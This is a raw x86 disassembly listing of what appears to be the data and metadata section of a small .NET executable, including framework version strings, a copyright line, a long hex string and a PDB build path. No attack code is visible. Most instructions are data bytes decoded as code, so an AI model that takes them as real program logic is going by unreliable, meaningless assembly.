  402eb0:	sub    DWORD PTR [ecx],eax
  402eb2:	add    BYTE PTR [edx+esi*1],ah
  402eb5:	cmp    DWORD PTR gs:[ecx+esi*1],esi
  402eb9:	xor    DWORD PTR [ecx+esi*1],esi
  402ebc:	sub    eax,0x37396637
  402ec1:	sub    eax,0x36353734
  402ec6:	sub    eax,0x64316162
  402ecb:	sub    eax,0x63656439
  402ed0:	fs cmp BYTE PTR gs:[ecx],bh
  402ed4:	xor    al,0x61
  402ed6:	xor    esp,DWORD PTR [eax+eax*1+0x0]
  402eda:	sub    DWORD PTR [ecx],eax
  402edc:	add    BYTE PTR [esp+esi*1],ah
  402edf:	xor    eax,0x32314142
  402ee4:	aaa    
  402ee5:	inc    esp
  402ee6:	sub    eax,0x38413031
  402eeb:	sub    eax,0x41453634
  402ef0:	sub    eax,0x37424138
  402ef5:	sub    eax,0x41453635
  402efa:	cmp    DWORD PTR [eax],esi
  402efc:	aaa    
  402efd:	cmp    BYTE PTR [ecx],bh
  402eff:	xor    al,0x33
  402f01:	inc    ebx
  402f02:	add    BYTE PTR [eax],al
  402f04:	aaa    
  402f05:	add    DWORD PTR [eax],eax
  402f07:	sbb    ch,BYTE PTR [esi]
  402f09:	dec    esi
  402f0a:	inc    ebp
  402f0b:	push   esp
  402f0c:	inc    esi
  402f0d:	jb     0x402f70
  402f0f:	ins    DWORD PTR es:[edi],dx
  402f10:	gs ja  0x402f82
  402f13:	jb     0x402f80
  402f15:	sub    al,0x56
  402f17:	gs jb  0x402f8d
  402f1a:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  402f21:	xor    eax,0xe540001
  402f26:	adc    al,0x46
  402f28:	jb     0x402f8b
  402f2a:	ins    DWORD PTR es:[edi],dx
  402f2b:	gs ja  0x402f9d
  402f2e:	jb     0x402f9b
  402f30:	inc    esp
  402f31:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  402f38:	popa   
  402f39:	ins    DWORD PTR es:[edi],dx
  402f3a:	add    BYTE PTR gs:0x1,al
  402f41:	add    BYTE PTR ds:0x10001,al
  402f47:	add    BYTE PTR [ecx+eax*1],bl
  402f4a:	add    BYTE PTR [edi],dl
  402f4c:	inc    ecx
  402f4d:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  402f51:	popa   
  402f52:	je     0x402fb9
  402f54:	inc    ecx
  402f55:	jo     0x402fc7
  402f57:	ins    BYTE PTR es:[edi],dx
  402f58:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  402f5f:	cs gs js 0x402fc8
  402f63:	add    BYTE PTR [eax],al
  402f65:	sbb    al,BYTE PTR [ecx]
  402f67:	add    BYTE PTR ds:0x7263694d,dl
  402f6d:	outs   dx,DWORD PTR ds:[esi]
  402f6e:	jae    0x402fdf
  402f70:	data16 je 0x402f93
  402f73:	inc    ebx
  402f74:	outs   dx,DWORD PTR ds:[esi]
  402f75:	jb     0x402fe7
  402f77:	outs   dx,DWORD PTR ds:[esi]
  402f78:	jb     0x402fdb
  402f7a:	je     0x402fe5
  402f7c:	outs   dx,DWORD PTR ds:[esi]
  402f7d:	outs   dx,BYTE PTR ds:[esi]
  402f7e:	add    BYTE PTR [eax],al
  402f80:	and    eax,0x4d200001
  402f85:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402f8c:	je     0x402f50
  402f8e:	scas   al,BYTE PTR es:[edi]
  402f8f:	and    BYTE PTR [esi+0x69],dl
  402f92:	jae    0x403009
  402f94:	popa   
  402f95:	ins    BYTE PTR es:[edi],dx
  402f96:	and    BYTE PTR [ebx+0x74],dl
  402f99:	jne    0x402fff
  402f9b:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  402fa2:	xor    DWORD PTR [edx],esi
  402fa4:	add    BYTE PTR [eax],al
  402fa6:	xor    eax,DWORD PTR [ecx]
  402fa8:	add    BYTE PTR [esi],ch
  402faa:	ret    0x20a9
  402fad:	dec    ebp
  402fae:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402fb5:	je     0x402fd7
  402fb7:	inc    ebx
  402fb8:	outs   dx,DWORD PTR ds:[esi]
  402fb9:	jb     0x40302b
  402fbb:	outs   dx,DWORD PTR ds:[esi]
  402fbc:	jb     0x40301f
  402fbe:	je     0x403029
  402fc0:	outs   dx,DWORD PTR ds:[esi]
  402fc1:	outs   dx,BYTE PTR ds:[esi]
  402fc2:	and    BYTE PTR cs:[ecx+0x6c],al
  402fc6:	ins    BYTE PTR es:[edi],dx
  402fc7:	and    BYTE PTR [edx+0x69],dh
  402fca:	addr16 push 0x72207374
  402fd0:	gs jae 0x403038
  402fd3:	jb     0x40304b
  402fd5:	gs fs add BYTE PTR cs:[eax],al
  402fda:	adc    DWORD PTR [ecx],eax
  402fdc:	add    BYTE PTR [ecx+esi*1],cl
  402fdf:	xor    DWORD PTR [esi],ebp
  402fe1:	xor    BYTE PTR [esi],ch
  402fe3:	xor    eax,0x37323730
  402fe8:	xor    DWORD PTR cs:[eax],eax
  402feb:	add    BYTE PTR ds:0x31080001,cl
  402ff1:	xor    DWORD PTR [esi],ebp
  402ff3:	xor    BYTE PTR [esi],ch
  402ff5:	xor    BYTE PTR [esi],ch
  402ff7:	xor    BYTE PTR [eax],al
  402ff9:	add    BYTE PTR [edx],cl
  402ffb:	add    DWORD PTR [eax],eax
  402ffd:	add    eax,0x552d6e65
  403002:	push   ebx
  403003:	add    BYTE PTR [eax],al
  403005:	sub    al,BYTE PTR [ecx]
  403007:	add    BYTE PTR ds:0x645c3a46,ah
  40300d:	fs pop esp
  40300f:	je     0x403080
  403011:	outs   dx,DWORD PTR ds:[esi]
  403012:	ins    BYTE PTR es:[edi],dx
  403013:	jae    0x403071
  403015:	fs gs jbe 0x40307d
  403019:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  403020:	ins    BYTE PTR es:[edi],dx
  403021:	push   eax
  403022:	jne    0x403086
  403024:	ins    BYTE PTR es:[edi],dx
  403025:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40302c:	outs   dx,BYTE PTR ds:[esi]
  40302d:	imul   eax,DWORD PTR [eax],0x0
  403030:	or     DWORD PTR [eax+0x1],0x0
  403034:	add    BYTE PTR [eax+0x30],0x30
  403038:	xor    dh,BYTE PTR [eax+esi*1]
  40303b:	xor    BYTE PTR [eax],dh
  40303d:	xor    BYTE PTR [eax],dh
  40303f:	arpl   WORD PTR [eax],di
  403041:	xor    BYTE PTR [eax],dh
  403043:	xor    BYTE PTR [eax],dh
  403045:	xor    BYTE PTR [ecx],dh
  403047:	xor    al,0x30
  403049:	xor    DWORD PTR [eax],esi
  40304b:	xor    BYTE PTR [eax],dh
  40304d:	xor    BYTE PTR [eax],dh
  40304f:	xor    BYTE PTR ss:[edx],dh
  403052:	xor    BYTE PTR [eax],dh
  403054:	xor    BYTE PTR [eax],dh
  403056:	xor    BYTE PTR [eax],dh
  403058:	xor    dh,BYTE PTR [eax+esi*1]
  40305b:	xor    BYTE PTR [eax],dh
  40305d:	xor    BYTE PTR ds:0x34333532,dh
  403063:	xor    DWORD PTR [ebx],esi
  403065:	xor    DWORD PTR [eax],esi
  403067:	xor    BYTE PTR [eax],dh
  403069:	cmp    BYTE PTR [eax],dh
  40306b:	xor    BYTE PTR [eax],dh
  40306d:	xor    BYTE PTR [eax],dh
  40306f:	xor    DWORD PTR [eax],esi
  403071:	xor    BYTE PTR [eax],dh
  403073:	xor    DWORD PTR [eax],esi
  403075:	xor    BYTE PTR [esi],dh
  403077:	xor    DWORD PTR [ebx],esi
  403079:	xor    edi,DWORD PTR [ecx]
  40307b:	cmp    DWORD PTR [ecx+0x66],esp
  40307e:	xor    WORD PTR [eax],di
  403081:	xor    WORD PTR gs:[ecx+0x32],sp
  403086:	arpl   WORD PTR [edx],si
  403088:	xor    eax,0x32613431
  40308d:	aaa    
  40308e:	xor    esp,DWORD PTR [ecx+0x34]
  403091:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  403095:	xor    al,0x32
  403097:	bound  esi,QWORD PTR [edi]
  403099:	xor    dh,BYTE PTR [ebx]
  40309b:	xor    dh,BYTE PTR [ecx]
  40309d:	xor    WORD PTR [edi],si
  4030a0:	xor    eax,0x32303137
  4030a5:	cmp    WORD PTR fs:[ebp+0x62],sp
  4030aa:	popa   
  4030ab:	fs popa 
  4030ad:	cmp    DWORD PTR ss:[ecx],edi
  4030b0:	xor    dh,BYTE PTR [ebx]
  4030b2:	xor    dh,BYTE PTR gs:[edi]
  4030b5:	xor    edi,DWORD PTR [eax]
  4030b7:	xor    al,0x30
  4030b9:	arpl   WORD PTR ss:[edx],si
  4030bc:	xor    DWORD PTR [ebp+0x35],esp
  4030bf:	bound  edi,QWORD PTR [eax]
  4030c1:	xor    BYTE PTR [ecx],dh
  4030c3:	xor    eax,0x62613235
  4030c8:	cmp    BYTE PTR [edx+esi*1+0x30],ah
  4030cc:	xor    BYTE PTR [ecx+0x36],ah
  4030cf:	xor    eax,0x35333261
  4030d4:	xor    BYTE PTR gs:[eax],dh
  4030d7:	xor    DWORD PTR [ecx+0x63],esp
  4030da:	cmp    DWORD PTR [ecx+0x64],esp
  4030dd:	arpl   WORD PTR [edx],si
  4030df:	xor    eax,0x38643266
  4030e4:	xor    DWORD PTR [ecx],esi
  4030e6:	bound  esi,QWORD PTR gs:[eax]
  4030e9:	cmp    DWORD PTR [ecx+edi*1],esi
  4030ec:	ss popa 
  4030ee:	xor    al,0x63
  4030f0:	ss popa 
  4030f2:	xor    eax,0x36346439
  4030f7:	xor    DWORD PTR [ecx],edi
  4030f9:	xor    eax,0x36633938
  4030fe:	cmp    DWORD PTR [esi+0x35],esp
  403101:	bound  esp,QWORD PTR [ecx+0x66]
  403104:	xor    BYTE PTR [ebx+0x34],ah
  403107:	xor    DWORD PTR [edi],esi
  403109:	cmp    DWORD PTR [ecx+0x34],esp
  40310c:	aaa    
  40310d:	xor    esi,DWORD PTR [ecx]
  40310f:	xor    DWORD PTR [ecx+edi*1+0x32],esp
  403113:	xor    eax,0x64633535
  403118:	xor    BYTE PTR [eax],dh
  40311a:	ss popa 
  40311c:	arpl   WORD PTR [ebx+0x38],sp
  40311f:	bound  esi,QWORD PTR ds:0x66393539
  403125:	xor    ah,BYTE PTR [edx+0x64]
  403128:	ss xor DWORD PTR gs:[eax],esi
  40312c:	xor    esi,DWORD PTR gs:[esi]
  40312f:	xor    BYTE PTR [ebx+0x33],ah
  403132:	xor    al,0x35
  403134:	xor    esi,DWORD PTR [edi]
  403136:	popa   
  403137:	xor    DWORD PTR [edx+esi*1+0x36],esp
  40313b:	ss fs popa 
  40313e:	cmp    BYTE PTR [eax],dh
  403140:	cmp    BYTE PTR ds:0x35363538,dh
  403146:	cmp    BYTE PTR [ebx],dh
  403148:	arpl   WORD PTR [eax],di
  40314a:	xor    eax,0x64313864
  40314f:	popa   
  403150:	aaa    
  403151:	xor    sp,WORD PTR [ebp+0x63]
  403155:	xor    BYTE PTR [ecx],dh
  403157:	gs cmp DWORD PTR fs:0x35633436,esi
  40315f:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  403163:	fs aaa 
  403165:	xor    DWORD PTR [ebx],esi
  403167:	arpl   WORD PTR [eax+esi*1+0x31],sp
  40316b:	aaa    
  40316c:	xor    ah,BYTE PTR [ebx+0x38]
  40316f:	xor    dh,BYTE PTR gs:[ebx]
  403172:	popa   
  403173:	xor    DWORD PTR [eax],esi
  403175:	data16 xor BYTE PTR [edx],dh
  403178:	xor    edi,DWORD PTR [ecx]
  40317a:	bound  edi,QWORD PTR [eax]
  40317c:	xor    BYTE PTR [ebx+0x39],ah
  40317f:	bound  esi,QWORD PTR ss:[eax]
  403182:	aaa    
  403183:	aaa    
  403184:	xor    esi,DWORD PTR [esi]
  403186:	xor    ax,0x3864
  40318a:	bound  esi,QWORD PTR [eax]
  40318c:	xor    dh,BYTE PTR [edx]
  40318e:	xor    eax,0x34613234
  403193:	gs aaa 
  403195:	xor    al,0x32
  403197:	xor    eax,0x66356131
  40319c:	xor    al,0x33
  40319e:	xor    bh,BYTE PTR [eax]
  4031a0:	xor    dh,BYTE PTR [ebx+esi*1]
  4031a3:	xor    DWORD PTR [eax],edi
  4031a5:	bound  esi,QWORD PTR [ebx]
  4031a7:	xor    eax,0x35613933
  4031ac:	popa   
  4031ad:	xor    BYTE PTR [eax],bh
  4031af:	aaa    
  4031b0:	data16 cmp BYTE PTR [ebp+0x35],ah
  4031b4:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  4031b8:	xor    DWORD PTR [ebx],esi
  4031ba:	xor    eax,0x61633966
  4031bf:	xor    al,0x37
  4031c1:	xor    sp,WORD PTR [edx+0x62]
  4031c5:	xor    ah,BYTE PTR [ebp+0x31]
  4031c8:	xor    BYTE PTR [ecx+0x66],ah
  4031cb:	data16 xor BYTE PTR [ecx+0x66],ah
  4031cf:	xor    BYTE PTR [eax],bh
  4031d1:	xor    al,0x39
  4031d3:	xor    eax,0x62663430
  4031d8:	aaa    
  4031d9:	arpl   WORD PTR [ebp+0x61],sp
  4031dc:	xor    esp,DWORD PTR [esi+0x66]
  4031df:	xor    DWORD PTR [ecx],edi
  4031e1:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  4031e5:	fs xor BYTE PTR gs:[ebp+0x64],ah
  4031ea:	popa   
  4031eb:	fs ss xor al,0x63
  4031ef:	cmp    BYTE PTR ss:[ebp+0x66],ah
  4031f3:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  4031f8:	xor    eax,0x30336436
  4031fd:	xor    ah,BYTE PTR [ecx+0x64]
  403200:	xor    eax,0x36646635
  403205:	cmp    BYTE PTR gs:[eax],dh
  403208:	xor    si,WORD PTR [eax]
  40320b:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  40320f:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  403214:	cmp    DWORD PTR gs:0x38353633,esi
  40321b:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  403223:	bound  esi,QWORD PTR ds:0x63363366
  403229:	xor    eax,0x66653234
  40322e:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  403233:	data16 cmp BYTE PTR [eax],bh
  403236:	cmp    BYTE PTR ds:0x33643833,dh
  40323c:	aaa    
  40323d:	xor    al,0x63
  40323f:	xor    WORD PTR gs:[eax],si
  403243:	ss popa 
  403245:	arpl   WORD PTR [esi+0x37],sp
  403248:	cmp    DWORD PTR fs:[ebx],esi
  40324b:	popa   
  40324c:	xor    al,0x34
  40324e:	xor    al,0x35
  403250:	arpl   WORD PTR [ebx],si
  403252:	arpl   WORD PTR [edi],si
  403254:	xor    esp,DWORD PTR [ebx+0x64]
  403257:	cmp    DWORD PTR [ecx],esi
  403259:	xor    DWORD PTR [esi+0x30],esp
  40325c:	xor    eax,0x61613137
  403261:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  403266:	fs popa 
  403268:	xor    DWORD PTR [edx],esi
  40326a:	bound  esi,QWORD PTR [ecx]
  40326c:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  403270:	arpl   WORD PTR [ebx],si
  403272:	aaa    
  403273:	xor    eax,0x813362
  403278:	popa   
  403279:	xor    eax,0x36363861
  40327e:	xor    DWORD PTR gs:[ebp+0x65],esp
  403282:	xor    DWORD PTR [eax],edi
  403284:	data16 cmp BYTE PTR ss:[eax],dh
  403288:	aaa    
  403289:	ss cmp BYTE PTR ss:[edx],dh
  40328d:	xor    BYTE PTR [ecx],bh
  40328f:	xor    sp,WORD PTR [edx+0x31]
  403293:	xor    DWORD PTR [edx],esi
  403295:	xor    esi,DWORD PTR [esi]
  403297:	popa   
  403298:	arpl   WORD PTR [ebp+0x35],sp
  40329b:	xor    dh,BYTE PTR gs:[ecx]
  40329e:	xor    WORD PTR [ecx],si
  4032a1:	aaa    
  4032a2:	cmp    BYTE PTR [eax],dh
  4032a4:	xor    esp,DWORD PTR [ecx+0x33]
  4032a7:	xor    DWORD PTR [ebx+esi*1],esi
  4032aa:	popa   
  4032ab:	bound  esp,QWORD PTR [edx+0x31]
  4032ae:	xor    dh,BYTE PTR [esi]
  4032b0:	fs xor BYTE PTR fs:[ebx],dh
  4032b4:	xor    eax,0x32643764
  4032b9:	data16 cmp BYTE PTR [edi],dh
  4032bc:	bound  esi,QWORD PTR ss:[esi]
  4032bf:	cmp    DWORD PTR [ebx],esi
  4032c1:	cmp    BYTE PTR [ecx+0x61],ah
  4032c4:	data16 xor ah,BYTE PTR [ebp+0x65]
  4032c8:	xor    esi,DWORD PTR [ecx+esi*1]
  4032cb:	xor    al,0x64
  4032cd:	xor    eax,0x64303234
  4032d2:	aaa    
  4032d3:	xor    eax,0x31323633
  4032d8:	xor    al,0x30
  4032da:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  4032de:	xor    al,0x61
  4032e0:	xor    al,0x39
  4032e2:	arpl   WORD PTR [eax+edi*1],si
  4032e5:	arpl   WORD PTR ss:[ebp+0x31],sp
  4032e9:	xor    esi,DWORD PTR [ebx+esi*1]
  4032ec:	xor    BYTE PTR [eax],dh
  4032ee:	popa   
  4032ef:	xor    dh,BYTE PTR [ecx]
  4032f1:	xor    BYTE PTR [esi],dh
  4032f3:	popa   
  4032f4:	bound  esi,QWORD PTR fs:[esi]
  4032f7:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  4032fb:	xor    esi,DWORD PTR [ebx]
  4032fd:	xor    eax,0x65663039
  403302:	data16 cmp BYTE PTR [ecx+0x64],ah
  403306:	xor    eax,0x63333463
  40330b:	bound  esp,QWORD PTR [ecx+0x38]
  40330e:	xor    dh,BYTE PTR [edx]
  403310:	cmp    DWORD PTR [eax],esi
  403312:	arpl   WORD PTR fs:[ecx+edi*1],si
  403316:	xor    eax,0x66653033
  40331b:	data16 cmp BYTE PTR fs:[esi],dh
  40331f:	xor    eax,0x39643332
  403324:	xor    al,0x38
  403326:	xor    esp,DWORD PTR [ebx+0x30]
  403329:	xor    BYTE PTR [esi+0x34],ah
  40332c:	xor    eax,0x34666138
  403331:	cmp    BYTE PTR ss:[ecx],bh
  403334:	xor    BYTE PTR [eax],dh
  403336:	xor    esi,DWORD PTR [esi]
  403338:	bound  esi,QWORD PTR [eax]
  40333a:	xor    ah,BYTE PTR gs:[ebx+0x36]
  40333e:	xor    DWORD PTR [eax+esi*1+0x37],esp
  403342:	aaa    
  403343:	fs aaa 
  403345:	bound  sp,DWORD PTR [ecx+0x63]
  403349:	xor    al,0x36
  40334b:	aaa    
  40334c:	popa   
  40334d:	xor    eax,0x62653630
  403352:	popa   
  403353:	xor    bh,BYTE PTR [ecx]
  403355:	gs xor al,0x36
  403358:	aaa    
  403359:	popa   
  40335a:	cmp    BYTE PTR [edi],dh
  40335c:	xor    DWORD PTR [ecx],edi
  40335e:	cmp    BYTE PTR [edx+0x30],ah
  403361:	xor    eax,0x34376333
  403366:	cmp    DWORD PTR [ecx+0x61],esp
  403369:	xor    ah,BYTE PTR [ecx+0x34]
  40336c:	xor    bh,BYTE PTR fs:[eax]
  40336f:	xor    al,0x30
  403371:	arpl   WORD PTR [edi],si
  403373:	cmp    BYTE PTR [eiz*2+0x6436],dh
  40337a:	push   ds
  40337b:	add    DWORD PTR [eax],eax
  40337d:	add    DWORD PTR [eax],eax
  40337f:	push   esp
  403380:	add    dl,BYTE PTR [esi]
  403382:	push   edi
  403383:	jb     0x4033e6
  403385:	jo     0x4033d5
  403387:	outs   dx,DWORD PTR ds:[esi]
  403388:	outs   dx,BYTE PTR ds:[esi]
  403389:	inc    ebp
  40338a:	js     0x4033ef
  40338c:	gs jo  0x403403
  40338f:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  403396:	ja     0x40340b
  403398:	add    DWORD PTR [eax],ecx
  40339a:	add    DWORD PTR [eax],eax
  40339c:	add    al,BYTE PTR [eax]
  40339e:	add    BYTE PTR [eax],al
  4033a0:	add    BYTE PTR [eax],al
  4033a2:	or     BYTE PTR [ecx],al
  4033a4:	add    BYTE PTR [eax],cl
	...
  4033ae:	add    BYTE PTR [eax],al
  4033b0:	xchg   edx,eax
  4033b1:	fist   WORD PTR [ecx]
  4033b3:	push   eax
  4033b4:	add    BYTE PTR [eax],al
  4033b6:	add    BYTE PTR [eax],al
  4033b8:	add    al,BYTE PTR [eax]
  4033ba:	add    BYTE PTR [eax],al
  4033bc:	sbb    al,0x1
  4033be:	add    BYTE PTR [eax],al
  4033c0:	enter  0x33,0x0
  4033c4:	enter  0x15,0x0
  4033c8:	push   edx
  4033c9:	push   ebx
  4033ca:	inc    esp
  4033cb:	push   ebx
  4033cc:	in     eax,0x13
  4033ce:	dec    eax
  4033cf:	enter  0x1f6,0x44
  4033d3:	dec    ebx
  4033d4:	xor    bh,0x35
  4033d7:	inc    eax
  4033d8:	add    BYTE PTR [eax-0x21],bh
  4033db:	test   DWORD PTR [ecx],eax
  4033dd:	add    BYTE PTR [eax],al
  4033df:	add    BYTE PTR [esi+0x3a],ah
  4033e2:	pop    esp
  4033e3:	bound  ebp,QWORD PTR [ecx+0x6e]
  4033e6:	popa   
  4033e7:	jb     0x403452
  4033e9:	gs jae 0x403448
  4033ec:	dec    ecx
  4033ed:	outs   dx,BYTE PTR ds:[esi]
  4033ee:	je     0x403455
  4033f0:	jb     0x40345f
  4033f2:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x73765c65
  4033fb:	gs je  0x40345a
  4033fe:	popa   
  4033ff:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  403403:	popa   
  403404:	je     0x40346b
  403406:	popa   
  403407:	jo     0x403479
  403409:	ins    BYTE PTR es:[edi],dx
  40340a:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  403411:	arpl   WORD PTR cs:[ebx+0x70],si
  403415:	jb     0x403486
  403417:	push   0x5f
  403419:	xor    dh,BYTE PTR ds:0x36343033
  40341f:	cmp    BYTE PTR [ebx+esi*1],dh
  403422:	pop    esp
  403423:	outs   dx,DWORD PTR ds:[esi]
  403424:	bound  ebp,QWORD PTR [edx+0x72]
  403427:	pop    esp
  403428:	js     0x403462
  40342a:	ss pop esp
  40342c:	inc    ecx
  40342d:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  403431:	popa   
  403432:	je     0x403499
  403434:	inc    ecx
  403435:	jo     0x4034a7
  403437:	ins    BYTE PTR es:[edi],dx
  403438:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40343f:	cs jo  0x4034a6
  403442:	bound  eax,QWORD PTR [eax]
	...
  4034e4:	or     al,0x35
	...
  4034ee:	add    BYTE PTR [eax],al
  4034f0:	cs xor eax,0x20000000
	...
  40350a:	add    BYTE PTR [eax],al
  40350c:	and    BYTE PTR ds:0x0,dh
	...
  403522:	pop    edi
  403523:	inc    ebx
  403524:	outs   dx,DWORD PTR ds:[esi]
  403525:	jb     0x40356c
  403527:	js     0x40358e
  403529:	dec    ebp
  40352a:	popa   
  40352b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  403532:	jb     0x403599
  403534:	gs cs fs ins BYTE PTR es:[edi],dx
  403538:	ins    BYTE PTR es:[edi],dx
  403539:	add    BYTE PTR [eax],al
  40353b:	add    BYTE PTR [eax],al
  40353d:	add    bh,bh
  40353f:	and    eax,0x402000
